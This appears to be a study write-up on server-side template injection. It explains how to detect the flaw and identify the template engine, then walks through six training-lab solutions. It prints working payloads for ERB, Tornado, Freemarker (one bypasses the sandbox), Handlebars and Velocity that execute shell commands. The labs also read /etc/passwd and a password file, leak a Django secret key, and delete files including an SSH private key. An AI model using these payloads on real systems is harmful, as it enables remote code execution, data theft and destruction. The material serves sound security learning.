Is when an attacker can use native template syntax to inject a malicious payload into a template, which is then executed server-side.

Template engines are designed to generate web pages by combining fixed templates with volatile data, and injection attacks occur when user input is concatenated directly into a template, rather than passed in as data.

This allows attackers to put directives in order to manipulate the template engine, which often enables them to take complete control of the server.

## How do these vulnerabilities arise?

Static templates that simply provide placeholders into which dynamic content is rendered are generally not vulnerable.

An example is an email that greets users by their name, as this extract from a Twig template:

`$output = $twig->render("Dear {first_name},", array("first_name" => $user.first_name) );`

This is not vulnerable because the first name is passed into the template as data.

But, since templates are simply strings, web devs sometimes directly concatenate user input into templates prior to rendering.

A similar example is when users are able to customize parts of the email before it's sent, like choosing the name that is used:

`$output = $twig->render("Dear " . $_GET['name']);`

Here, instead of a static value, part of the template itself is being dynamically generated using the `GET` parameter `name`. 

The template syntax is evaluated server-side, and this can allow an attacker to place a payload in the name parameter.

Sometimes this behavior is done intentionally, as some websites allow privileged users, to edit or submit custom templates by design.

## Constructing an attack

To perform an attack, the following steps should be taken:

- Detect
- Identify
- Exploit
	- Read
	- Explore
	- Attack

### Detect

Perhaps the simplest initial approach is to try fuzzing the template by injecting a sequence of special characters, which are used in template expressions, such as `${{<%[%'"}}%\`.

If there is some exception, it indicates that the injected syntax is being interpreted by the server.

It's also important to try some context-specific approaches if fuzzing was inconclusive.

#### Plaintext context
Some templates allow to freely input content either by using the HTML tags or the template's native syntax, which then will be rendered to HTML on the backend before the response is sent.

For example, in Freemaker `render('Hello ' + username)` can be exploited for XSS, but it can be also a server-side template injection attack.

We can test it by:

`http://vulnerable-website.com/?username=${7*7}`

and if the result is `Hello 49` it shows that the operation has been done server-side.

#### Code context
In some other cases the vulnerability is by user input being placed within a template expression.

This can take the form of a user-controllable variable name being placed inside a parameter, such as:

```sh
greeting = getQueryParameter('greeting')
engine.render("Hello {{"+greeting+"}}", data)
```

and the URL would be:

`http://vulnerable-website.com/?greeting=data.username`

this would render the output to `Hello Halil`.

This doesn't show a `XSS` and is almost indistinguishable from a simple hashmap lookup. 

To test for Server-Side template injection, first establish that the parameter doesn't contain a direct XSS by injecting arbitrary HTML

`http://vulnerable-website.com/?greeting=data.username<tag>`

This would return a blank entry in the output `Hello ` and now the next step is to try and break out of the statement using common templating syntax to try and inject arbitrary HTML after it:

`http://vulnerable-website.com/?greeting=data.username}}<tag>`

If the output is rendered correctly, with the arbitrary HTML, it is a key indication that the vulnerability is present.

`Hello Carlos<tag>`

### Identify

The next step after `Detecting` is to `Identify` the template engine.

Many of the use very similar syntax, chosen not to clash with HTML, and it can be relatively simple to create probing payloads to test which template engine is being used.

Just submit invalid syntax, and that is often enough as the error message will tell what template engine it is.

For example the invalid expression `<%=foobar%>` triggers this response from the Ruby-based ERB engine:

```sh
(erb):1:in `<main>': undefined local variable or method `foobar' for main:Object (NameError)
from /usr/lib/ruby/2.5.0/erb.rb:876:in `eval'
from /usr/lib/ruby/2.5.0/erb.rb:876:in `result'
from -e:4:in `<main>'
```

![[Pasted image 20250123164533.png]]

But it should be taken into consideration that the same payload sometimes returns a successful response in more than one template language:

`{{7*'7'}}` returns `49` in `Twig` and `7777777` in `Jinja2`.

### Exploit

Typically the exploitation process has three main steps:
- Read
- Explore the environment
- Create a custom attack

#### Read

Reading the documentation of the template is the place to start. 

Basic syntax is obviously important, along with key functions and handling of variables. Even knowing how to embed native code blocks in the template can sometimes lead to an exploit.

For example, one you know that Python-basd Mako template engine is used, achieving RCE can be as simple as:

```python
<%
	import os
	x=os.popen('id').read()
	%>
	${x}
```

### Lab.1 Basic Server-Side Template Injection

**Description**

The lab has an unsafe construction of an ERB template.

The goal of the lab is to find a way to execute arbitrary code, and then delete `morale.txt` from the Carlos's home directory.

**Solution**

In the website from the lab, there are some products which can be bought.

Here, when you click on the products you will see the details, but when some product is not in stock anymore, it shows: `Unfortunately this product is out of stock`.

This request `GET /?message=Unfortunately%20this%20product%20is%20out%20of%20stock` I send to the Intruder, and I highlight the value of the `message` parameter.

From the `Hackstrics` I copy some of the tests to check about the vulnerability:

```ruby
{{7*7}}
${7*7}
<%= 7*7 %>
${{7*7}}
#{7*7}
```

With the `Snipper Attack` I paste the above tests in the `Simple list` payload list.

In `Settings` I add a `Grep - Extract` from the response where the error happened, so it will be easier to see the response I receive from the tests.

I run the attack and I got the following results:
![[Pasted image 20250124101000.png]]

We see that for the `<%= 7*7 %>` I got a result of `49` confirming the vulnerability.

Knowing also that it is `ERB`, I will use it's syntax, to try code execution.

With the `GET /?message=<%= system("whoami") %> HTTP/2` I got a response saying that I'm `carlos`.

Then with the `GET /?message=<%= system("ls") %> HTTP/2` I got the list of the files present in the current directory, and among them there were also the `morale.txt`, so I put the command to delete it.

`GET /?message=<%= system("rm morale.txt") %> HTTP/2` I send the request, the file is deleted, and the lab is resolved.

--------

### Lab.2 - Basic Server-Side Template Injection (Code Context)

**Description**

The lab has an unsafe way to use the `Tornado` template. The goal to solve the lab is to delete `morale.txt` file from `Carlos's ` home directory.

`wiener:peter` credentials can be used to login.

**Solution**

When I login with the `wiener:peter` I see that there is an option to choose the `preferred name` where I can choose a `firstname` or a `nickname`. I selected the `nickname` but at this time, I didn't see any change.

![[Pasted image 20250126162935.png]]

But, I saw the change when I posted a comment in the site. There, it was using the name `H0td0g`:

![[Pasted image 20250126163031.png]]

So, this means, by using `preferred name`, I change the way how I'm presented when I post comments. Let's check the change of the `preferred name` in Burp.

The name change happens with the request 

```http
POST /my-account/change-blog-post-author-display HTTP/2
...

blog-post-author-display=user.first_name&csrf=nhoN8qfTAGSaHo7vCwDsuh7TdZpWTM7S
```

Now, let's try some `Tornado` syntax here found on `Hacktricks` and see if the vulnerability lies here.

I modified the request body to:

`blog-post-author-display={{7*7}}...`

And I see now at the comment section that my name is shown as:

![[Pasted image 20250126163855.png]]

This means that I found a vulnerability here.

I modify the syntax to put the system command `whoami`:

`blog-post-author-display=user.nickname}}{%25+import+os+%25}{{os.system('whoami')}}`

And the result is:

![[Pasted image 20250126165426.png]]

So I see the name of `carlos` there, let's see the files in the current directory.

`blog-post-author-display=user.nickname}}{%25+import+os+%25}{{os.system('ls')}}`

![[Pasted image 20250126165518.png]]

So, now let's just delete the file: `blog-post-author-display=user.nickname}}{%25+import+os+%25}{{os.system('rm%20+morale.txt')}}`

The file is deleted and the lab is solved.

------------

### Lab.3 Server-Side Template Injection using Documentations

**Description**

The goal of the lab is to identify the template engine and then use the documentation to work out how to execute arbitrary code. Afterwards the main goal is to delete `morale.txt` from the Carlos's home directory

`content-manager:C0nt3ntM4n4g3r` are credentials that can be used to login.

**Solution**

I login with the given credentials, then I go to Home. After I select an article, I see the option to `Edit Template`.

![[Pasted image 20250126170634.png]]

After clicking there I see the syntax of the template engine:

![[Pasted image 20250126170856.png]]

I just changed one value to something that don't exist there, such as `${halil}` and I got a list of errors.

But the error is telling me the template:

![[Pasted image 20250126171042.png]]

Now, I know that the template engine is `freemaker` so now it will be much easier to find the correct syntax and do the system commands.

By adding this payload `<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("whoami")}` I was able to read the current user that I am executing commands from, which is `carlos`.

![[Pasted image 20250126172204.png]]

with `ls` I see that there is `morale.txt` there, so I modify the command to `<p>Hurry! Only ${product.stock} left of ${product.name} at ${product.price}.</p><#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("rm morale.txt")}`

And the file is deleted and the lab is solved.

-------

### Lab.4 Server-Side Template Injection in an Unknown Language with a documented Exploit

**Description**

The goal of the lab is to identify the template engine and find a documented exploit online, then execute code and delete the `morale.txt` file from Carlos's home directory.

**Solution**

When I visit the page, and click on the first article to see the details, I see there a message saying `Unfortunately this product is out of stock`. So, let's try to see if this message is vulnerable.

I sent the request for the message: `GET /?message=Unfortunately%20this%20product%20is%20out%20of%20stock HTTP/2` to Intruder and add there a list of test payloads, to see the responses.

After I execute a Sniper Attack, I see the responses, and some of them like `{{7*7}}` have produced errors, and when I see the response, it tells that it uses `handlebars`.

So, I have identified the template engine.

![[Pasted image 20250126175817.png]]

Now, I will search for some existing `handlebars` payloads. I found one of them on `Hacktricks`:

```JS
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').exec('whoami');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

and this one to delete the file:

```js
wrtz{{#with "s" as |string|}}
    {{#with "e"}}
        {{#with split as |conslist|}}
            {{this.pop}}
            {{this.push (lookup string.sub "constructor")}}
            {{this.pop}}
            {{#with string.split as |codelist|}}
                {{this.pop}}
                {{this.push "return require('child_process').exec('rm morale.txt');"}}
                {{this.pop}}
                {{#each conslist}}
                    {{#with (string.sub.apply 0 codelist)}}
                        {{this}}
                    {{/with}}
                {{/each}}
            {{/with}}
        {{/with}}
    {{/with}}
{{/with}}
```


I url-encode this, and put this in the request, as a value to `message`:

```http
GET /?message=wrtz%7B%7B#with%20%22s%22%20as%20%7Cstring%7C%7D%7D%0A%20%20%20%20%7B%7B#with%20%22e%22%7D%7D%0A%20%20%20%20%20%20%20%20%7B%7B#with%20split%20as%20%7Cconslist%7C%7D%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%7B%7Bthis.pop%7D%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%7B%7Bthis.push%20(lookup%20string.sub%20%22constructor%22)%7D%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%7B%7Bthis.pop%7D%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%7B%7B#with%20string.split%20as%20%7Ccodelist%7C%7D%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7B%7Bthis.pop%7D%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7B%7Bthis.push%20%22return%20require('child_process').exec('rm%20morale.txt');%22%7D%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7B%7Bthis.pop%7D%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7B%7B#each%20conslist%7D%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7B%7B#with%20(string.sub.apply%200%20codelist)%7D%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7B%7Bthis%7D%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7B%7B/with%7D%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7B%7B/each%7D%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%7B%7B/with%7D%7D%0A%20%20%20%20%20%20%20%20%7B%7B/with%7D%7D%0A%20%20%20%20%7B%7B/with%7D%7D%0A%7B%7B/with%7D%7D HTTP/2
Host: 0a55007a03081a9a8053716700560078.web-security-academy.net
```

The file is deleted, and the lab is solved.

-------

## Explore

Many templates expose a `self` or `environment` object of some kind, which acts like a namespace and contains all objects, methods, and attributes which are supported by the template engine.

If such objects exists, you can use it to generate a list of objects that are in scope. For example, in Java-based templating languages you can sometimes list all variables using this injection:

`${T(java.lang.System).getenv()}`

This can create a shortlist of potentially interesting objects and methods to investigate further, but also `Burp Intruder` provides a built-in wordlist for brute-forcing variable names.

There are also some site-specific objects supplied by the web developer, and they are likely to contain sensitive information of exploitable methods. 

You may need to study an object's behavior in the context of each distinct template before you find a way to exploit it.

Also, not always RCE is possible, but still there are many exploits that can be available such as `File Path Traversal.`

### Lab.4 Server-Side Template Injection with Information Disclosure via User-Supplied Objects

**Description**

The lab is vulnerable due to the way an object is being passed into the template, and it can be exploited to access sensitive data. The goal of the lab is to access sensitive data, so to solve the lab, you need to steal and submit the framework's secret key.

`content-manager: C0nt3ntM4n4g3r` are the credentials which you can use to login.

**Solution**

I access the lab with the given credentials.

In the homepage I click on one of the articles, and there there is a button to `Edit Template`.

After clicking on that I have the syntax used to create the description.

![[Pasted image 20250126190945.png]]
 
Let's delete everything above the last line, to keep it simple, and replace the `product.stock` with something that is not known, doesn't exist there, such as my name `halil`. And it should look like:

`<p>Hurry! Only {{halil}} left of {{product.name}} at {{product.price}}.</p>`

That didn't work, as I don't see anything that would give me some information there. It's only:

`Hurry! Only left of The Trolley-ON at $46.42.`

I send that request to the Intruder, and I see that the body is:
`%3Cp%3EHurry%21+Only+%7B%7Bhalil%7D%7D+left+of+%7B%7Bproduct.name%7D%7D+at+%7B%7Bproduct.price%7D%7D.%3C%2Fp%3E`

After decoding that with the `cyberchef` from `URL decoder` I see `<p>Hurry! Only {{halil}} left of {{product.name}} at {{product.price}}.</p>`.

Now, I add a payload position on `%7B%7Bhalil%7D%7D`, and with the Sniper Attack I add these to the list payload:

```
{{7*7}}
${7*7}
<%= 7*7 %>
${{7*7}}
#{7*7}
```

In the payload processing I add a rule to convert them to URL.

I got `302 Found` and I just visit the article page, and I see that I got an error message, mentioning `DJANGO`.

So, now I have the template engine used here.

In Django you can invoke the `debug` by writing `{% debug %}` and url-encoded this is: `%7B%25%20debug%20%25%7D`.

After refreshing the page I got a list of objects and properties.

```text
Hurry! Only {'product': {'name': 'The Trolley-ON', 'price': '$46.42', 'stock': 594}, 'settings': }{'False': False, 'None': None, 'True': True} {'Cookie': , 'HTMLParser': , 'SocketServer': , 'StringIO': , 'UserDict': , 'UserList': , '__builtin__': , '__future__': , '__main__': , '_abcoll': , '_ast': , '_bisect': , '_codecs': , '_collections': , '_ctypes': , '_functools': , '_hashlib': , '_heapq': , '_io': , '_json': , '_locale': , '_random': , '_socket': , '_sre': , '_ssl': , '_struct': , '_sysconfigdata': , '_sysconfigdata_nd': , '_warnings': , '_weakref': , '_weakrefset': , 'abc': , 'argparse': , 'array': , 'ast': , 'atexit': , 'base64': , 'binascii': , 'bisect': , 'bz2': , 'cPickle': , 'cStringIO': , 'calendar': , 'cgi': , 'codecs': , 'collections': , 'contextlib': , 'copy': , 'copy_reg': , 'ctypes': , 'ctypes._ctypes': None, 'ctypes._endian': , 'ctypes.ctypes': None, 'ctypes.errno': None, 'ctypes.os': None, 'ctypes.re': None, 'ctypes.struct': None, 'ctypes.subprocess': None, 'ctypes.sys': None, 'ctypes.tempfile': None, 'ctypes.util': , 'datetime': , 'decimal': , 'dis': , 'django': , 'django.__future__': None, 'django.apps': , 'django.apps.collections': None, 'django.apps.config': , 'django.apps.django': None, 'django.apps.functools': None, 'django.apps.importlib': None, 'django.apps.os': None, 'django.apps.registry': , 'django.apps.sys': None, 'django.apps.threading': None, 'django.apps.warnings': None, 'django.conf': , 'django.conf.__future__': None, 'django.conf.django': None, 'django.conf.global_settings': , 'django.conf.importlib': None, 'django.conf.os': None, 'django.conf.time': None, 'django.core': , 'django.core.__future__': None, 'django.core.base64': None, 'django.core.cache': , 'django.core.cache.__future__': None, 'django.core.cache.backends': , 'django.core.cache.backends.__future__': None, 'django.core.cache.backends.base': , 'django.core.cache.backends.django': None, 'django.core.cache.backends.time': None,
...
```

Here I see that I can access the `settings` object and I see in the documentations that it has also a property `SECRET_KEY` which can be accessed by `{{settings.SECRET_KEY}}` and if url encoded it is: `%7B%7Bsettings.SECRET_KEY%7D%7D`.

So, I put that and send the request again, the body should look like:
`csrf=igQTSvjyfggm8DjIVxJ6xFSeIZyWE0CT&template=%3Cp%3EHurry%21+Only+%7B%7Bsettings.SECRET_KEY%7D%7D+left+of+%7B%7Bproduct.name%7D%7D+at+%7B%7Bproduct.price%7D%7D.%3C%2Fp%3E&template-action=save`

After checking the page, I see the code: `Hurry! Only 82v97tio2h8tpg5a0xs5x4cfg6qy2lv5 left of The Trolley-ON at $46.42.` which I submit, and the lab is solved.

-------

## Create a Custom Attack

Until now we constructed an attack by:
- Reusing a documented exploit
- using well-known vulnerabilities in a template engine

But, sometimes you need to construct a custom exploit.

For example, you find that the template engine executes templates inside a `sandbox`, which makes the exploit difficult, or even impossible.

After identifying the attack surface, if no obvious way to exploit, you need to proceed with auditing techniques by reviewing each function for exploitable behavior, and sometimes you may be able to construct a complex attack.

**Constructing a Custom Exploit using an Object Chain**

The first step is to identify `objects` and `methods` to which you have access. Then put a shortlist of objects that you want to investigate.

When studying documents, pay attention to which methods these objects grant access to, and which objects they return.

In the documentation you can discover combinations of methods that you can chain together, and doing this with the right objects and methods sometimes you gain access to dangerous functionality and sensitive data.

For example, in `Velocity`, a Java-based template engine, you have access to `ClassTool` object called `$class`, and after studying the documentation you see that you can chain `$class.inspect()` method and `$class.type` property to obtain references to arbitrary objects.

This as used in the pas to execute shell commands on the target system:

`$class.inspect("java.lang.Runtime").type.getRuntime().exec("bad-stuff-here")`

### Lab. 5 Server-Side Template Injection in a Sandboxed Environment

**Description**

The lab uses `Freemarker` template engine, and it's vulnerable to server-side template injection due to its poorly implemented sandbox. Read the file `my_password.txt` from Carlos's home directory and submit the content of the file.

You can login with: `content-manager:C0nt3ntM4n4g3r`.

**Solution**

First I login with the given credentials, and view the details of a product.

There is an option to `Edit Template`, and in there I see that I have access to the `product` object.

![[Pasted image 20250127013550.png]]

I delete the unnecessary parts, and leave only the product object, to make the process simpler.

Let's just put something that doesn't exist, to see if we get an error, and see the template engine from there.

For example, instead of `product.price` i put `halil`.

There I see the error and it is written the template engine, which is `freemarker`.

![[Pasted image 20250127013737.png]]

Now, there is a way here to explore the documentation for Java and to find a chain of methods that grant access to a class with a static method that lets you read files.

Another way is to see for some existing payloads, that will bypass the sandbox environment. Lets check on `Hacktricks` for `Freemarker`.

There is an available payload for the versions below 2.3.30:

```java
<#assign classloader=article.class.protectionDomain.classLoader>
<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
${dwf.newInstance(ec,null)("id")}
```

But, here we see that it uses the `article.class` but I don't know if we have that in our lab, so I will replace that with `product.class`.

There I see that I got some results back:

`<p>Hurry! Only 839 left of 3D Voice Assistants at uid=12002(carlos) gid=12002(carlos) groups=12002(carlos) .</p>`

Let's try `whoami`, and I see that it return `carlos`.

With the `ls` it shows that there exists in the current directory the `my_password.txt`:

`<p>Hurry! Only 999 left of 3D Voice Assistants at my_password.txt .</p>`

Let's try to open that by putting `cat my_password.txt`.

And I got the contents:

`<p>Hurry! Only 138 left of 3D Voice Assistants at neksr5agpxyvd0yfjpuy.</p>`

which by providing them solves the lab.

----------

**Constructing a custom exploit using developer-supplied objects**

Sometimes templates run in a secure, locked-down environment and this makes the exploitation for RCE much more difficult, there may be still some ways.

As for example, to read files, as developer-created objects that are exposed to the template can offer a less-hardened attack surface.

Since, documentation for site-specific objects are hard to find, sometimes non-existent, the exploitation should be done by investigating the website's behavior manually and identify the attack surface, the n construct the custom exploit accordingly.

### Lab.6 Server-Side Template Injection with a Custom Exploit

**Description**
The goal of the lab is to create a custom exploit and delete the file `/.ssh/id_rsa` from Carlos's home directory.

`wiener:peter` can be used to login.

**Solution**

I login to the page with the given credentials, and there I'm provided with the option to update the email, change the preferred name, and choose an avatar.

We can also leave comments on the page.

So, the first step is to find some place when our input got reflected.

And for this we got three candidates now, and let's try it on the comments.

None of the payloads did work on the comment section:

![[Pasted image 20250127090511.png]]

Let's try the second candidate, by changing the preferred name. I change that to the nickname, and send the request to do that on Burp Repeater.

The body of the post request is:

```http
blog-post-author-display=user.nickname&csrf=cUmfG1uDRV0PNWITUldBDQi0tlwTcfhh
```

I'm going just to change the `blog-post-author-display` to `user.halil` and just see if that triggers some error.

And when I refresh the page, nothing shows on, not even the name of the user.

![[Pasted image 20250127090832.png]]

Let's try to make the request with just `user`.

And, now I got an error, which also tells the template engine which is `Twig`.

![[Pasted image 20250127090937.png]]

I'm going to try some Twig payloads in there now, such as `{{7*7}}` but that doesn't work:

![[Pasted image 20250127091324.png]]

Let's revert it back to `user.nickname` in order to show the page, and try the avatar change.

It expects an image format, but let's try some other types of file, like a php. And there I got an error, but it tells us the function that is being used

```text
PHP Fatal error:  Uncaught Exception: Uploaded file mime type is not an image: text/php in /home/carlos/User.php:28
Stack trace:
#0 /home/carlos/avatar_upload.php(19): User->setAvatar('/tmp/shell.php', 'text/php')
#1 {main}
  thrown in /home/carlos/User.php on line 28
```

Since this function is part of the object `User` let's just try this when we changed our preferred name, and instead of `user.nickname` make it `user.setAvatar()`.

![[Pasted image 20250127093003.png]]

Based on this error we can conclude that the function works here as well, but we haven't passed two of the arguments that it expects.

Let's try to put the file first at `/etc/passwd` with the image mime type.

`user.setAvatar('/etc/passwd','image/png')`

Then when I load the comment that I posted, I see a link with a `broken image as avatar`, but let's copy the link to the avatar and make a `GET` request to it.

It downloaded the file, which contains the `/etc/passwd` content.

```shell
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
peter:x:12001:12001::/home/peter:/bin/bash
carlos:x:12002:12002::/home/carlos:/bin/bash
user:x:12000:12000::/home/user:/bin/bash
elmer:x:12099:12099::/home/elmer:/bin/bash
academy:x:10000:10000::/academy:/bin/bash
messagebus:x:101:101::/nonexistent:/usr/sbin/nologin
dnsmasq:x:102:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
systemd-timesync:x:103:103:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:104:105:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:105:106:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
mysql:x:106:107:MySQL Server,,,:/nonexistent:/bin/false
```

From one of the errors above, also the location of the `User` function got revealed, so let's try to read that one.

This, by sending a request to change the avatar with the following body:

`blog-post-author-display=user.setAvatar('//home/carlos/User.php','image/png')&csrf=cUmfG1uDRV0PNWITUldBDQi0tlwTcfhh`

And after refreshing the page, and sending a `GET` request to the avatar I got the `User.php`:

```php
<?php

class User {
    public $username;
    public $name;
    public $first_name;
    public $nickname;
    public $user_dir;

    public function __construct($username, $name, $first_name, $nickname) {
        $this->username = $username;
        $this->name = $name;
        $this->first_name = $first_name;
        $this->nickname = $nickname;
        $this->user_dir = "users/" . $this->username;
        $this->avatarLink = $this->user_dir . "/avatar";

        if (!file_exists($this->user_dir)) {
            if (!mkdir($this->user_dir, 0755, true))
            {
                throw new Exception("Could not mkdir users/" . $this->username);
            }
        }
    }

    public function setAvatar($filename, $mimetype) {
        if (strpos($mimetype, "image/") !== 0) {
            throw new Exception("Uploaded file mime type is not an image: " . $mimetype);
        }

        if (is_link($this->avatarLink)) {
            $this->rm($this->avatarLink);
        }

        if (!symlink($filename, $this->avatarLink)) {
            throw new Exception("Failed to write symlink " . $filename . " -> " . $this->avatarLink);
        }
    }

    public function delete() {
        $file = $this->user_dir . "/disabled";
        if (file_put_contents($file, "") === false) {
            throw new Exception("Could not write to " . $file);
        }
    }

    public function gdprDelete() {
        $this->rm(readlink($this->avatarLink));
        $this->rm($this->avatarLink);
        $this->delete();
    }

    private function rm($filename) {
        if (!unlink($filename)) {
            throw new Exception("Could not delete " . $filename);
        }
    }
}

?>
```

Here there is the public function `gdprDelete` which deletes the avatar. 

In this case let's set the `id_rsa` file that we want to delete, as the avatar.

`blog-post-author-display=user.setAvatar('/home/carlos/.ssh/id_rsa','image/png')&csrf=cUmfG1uDRV0PNWITUldBDQi0tlwTcfhh`

And now call the function to delete the avatar `blog-post-author-display=user.gdprDelete()&csrf=cUmfG1uDRV0PNWITUldBDQi0tlwTcfhh`, which in our case is the `id_rsa` file. And the lab is solved.


